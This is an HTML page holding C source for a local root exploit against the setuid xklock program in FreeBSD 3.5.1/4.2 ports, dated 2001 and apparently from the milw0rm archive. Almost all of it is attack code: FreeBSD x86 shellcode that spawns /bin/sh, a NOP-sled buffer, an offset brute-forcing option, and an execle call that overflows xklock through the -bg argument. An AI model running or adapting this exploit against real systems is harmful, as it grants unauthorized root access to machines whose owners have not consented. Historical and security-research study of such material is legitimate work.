<html><head><title>FreeBSD 3.5.1/4.2 ports package local root exploit</title></head><pre>/*
 * xklock - FreeBSD 3.5.1 &amp; 4.2 ports package local root exploit
 * 
 * The X key lock program contain several exploitable buffer overflows
 * in command line arguments aswell as the 'JNAME' environment variable.
 * xklock is installed setuid root by default.
 * This POC exploit (ab)uses the -bg arg, brute force offset if required.
 *
 * Usage: ./exklock &lt;offset&gt;
 *
 * dethy@synnergy.net // www.synnergy.net
 * 20 Feb 2001.
 *
 */ 

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define EGGSIZE 1024
#define RETSIZE 264
#define NOP 0x90
#define OFFSET 0

char shellcode[]= // execve() freebsd x86
	&quot;\xeb\x37\x5e\x31\xc0\x88\x46\xfa\x89\x46\xf5\x89\x36\x89\x76&quot;
	&quot;\x04\x89\x76\x08\x83\x06\x10\x83\x46\x04\x18\x83\x46\x08\x1b&quot;
	&quot;\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x1d\x50\x56\xff&quot;
	&quot;\x36\xb0\x3b\x50\x90\x9a\x01\x01\x01\x01\x07\x07\xe8\xc4\xff&quot;
	&quot;\xff\xff\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02&quot;
	&quot;\x02\x02\x02/bin/sh.-c.sh&quot;;


u_long get_sp(void) { __asm__(&quot;movl %esp,%eax&quot;); }

int main(int argc, char *argv[]) {
 char egg[EGGSIZE], ret[RETSIZE];
 int i, eggsize = EGGSIZE, retsize = RETSIZE, nop = NOP, offset=OFFSET;
 long *address;
  
 if(argc &gt; 1){ offset = atoi(argv[1]); }
 (char *)address = get_sp - offset;
 fprintf(stderr, &quot;Using addr: 0x%x\n&quot;, address);

 memset(egg, nop, eggsize);
 memcpy(egg+(eggsize - strlen(shellcode) - 1), shellcode, strlen(shellcode));
 for(i=0; i &lt; retsize; i+=4) *(int *)&amp;ret[i]=address;

 if(execle(&quot;/usr/local/bin/xklock&quot;, egg, &quot;-bg&quot;, ret, NULL, NULL)) {
  fprintf(stderr,&quot;Unable to execute /usr/local/bin/xklock\n&quot;);
  exit(1);
 }
}


// milw0rm.com [2001-03-03]</pre></html>